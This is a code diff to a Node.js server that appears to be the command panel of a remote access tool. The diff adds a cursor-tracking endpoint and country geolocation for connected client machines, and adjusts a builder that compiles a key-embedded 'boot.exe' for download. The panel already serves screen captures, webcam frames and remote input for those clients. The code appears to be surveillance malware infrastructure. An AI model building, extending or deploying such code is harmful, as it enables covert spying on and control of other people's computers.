@@ -13,9 +13,10 @@ import https from 'node:https';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import db, { UPLOAD_DIR } from './db.js';
-import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors } from './net.js';
+import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
+import { countriesFor } from './builder/geo.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -73,7 +74,7 @@ app.use(cookieParser());
 app.use((req, res, next) => {
   const t = Date.now();
   res.on('finish', () => {
-    const skip = req.path.includes('/screen') || req.path.endsWith('/webcam');
+    const skip = req.path.includes('/screen') || req.path.endsWith('/webcam') || req.path.endsWith('/cursor');
     if (!skip) console.log(`[http] ${req.method} ${req.url} ${req.ip} -> ${res.statusCode} (${Date.now() - t}ms)`);
   });
   next();
@@ -100,6 +101,7 @@ const limitGlobal = limit({
   message: { error: 'too many requests' },
   skip: (req) =>
     req.path.endsWith('/screen') ||
+    req.path.endsWith('/cursor') ||
     req.path.endsWith('/input') ||
     req.path.endsWith('/monitors') ||
     req.path.endsWith('/webcam') ||
@@ -278,7 +280,7 @@ app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
   res.json({ ok: true });
 });
 
-app.get('/api/clients', requireAuth, (req, res) => {
+app.get('/api/clients', requireAuth, async (req, res) => {
   const status = String(req.query.status || 'all').toLowerCase();
   const q      = String(req.query.q || '').trim();
   const limitN = Math.min(Math.max(Number(req.query.limit  || 50),  1), 200);
@@ -310,14 +312,20 @@ app.get('/api/clients', requireAuth, (req, res) => {
   const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen < ?`)
     .get(req.user.uid, cutoff);
 
+  let geo = {};
+  try { geo = await countriesFor(rows.map(r => r.ip)); } catch {}
+
   res.json({
     total:   Number(totalRow.n),
     online:  Number(onlineRow.n),
     offline: Number(offlineRow.n),
     rows: rows.map(r => ({
-      id: r.id, hostname: r.hostname, ip: r.ip,
+      id: r.id,
+      hostname: r.hostname,
+      ip: r.ip,
       online: now - r.last_seen < 30_000,
       lastSeen: r.last_seen,
+      country: geo[r.ip] || null,
     })),
   });
 });
@@ -443,6 +451,15 @@ app.get('/api/clients/:id/screen', requireAuth, (req, res) => {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
   res.setHeader('Pragma', 'no-cache');
   res.send(bytes);
+});
+
+app.get('/api/clients/:id/cursor', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+  const c = getCursor(cid);
+  if (!c) return res.status(204).end();
+  res.json(c);
 });
 
 app.get('/api/clients/:id/monitors', requireAuth, (req, res) => {
@@ -600,13 +617,10 @@ app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
 
 // ---------- builder ----------
 
-// no external bases — the rust source is the base
 app.get('/api/build/bases', requireAuth, (req, res) => {
   res.json([]);
 });
 
-// compile boot.exe with the account key baked into embedded_key.rs,
-// drop it in /download/ so /api/downloads/boot.exe serves it
 app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   const { key } = req.body || {};
 
@@ -623,14 +637,12 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     bootBuf = await buildBoot({ key: buildKey });
   } catch (e) {
     console.error('[build] cargo failed:', e);
-    const msg = (e.stderr || e.message || 'unknown').toString().slice(0, 2000);
+    const msg = (e.stderr || e.message || 'unknown').toString().slice(-3000);
     return res.status(500).json({ error: 'compile failed: ' + msg });
   }
 
-  // live file — what /api/downloads/boot.exe serves
   fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), bootBuf, { mode: 0o755 });
 
-  // archive for the builds table
   const outName = `boot_${Date.now()}.exe`;
   const outPath = path.join(BUILD_DIR, outName);
   fs.writeFileSync(outPath, bootBuf, { mode: 0o755 });
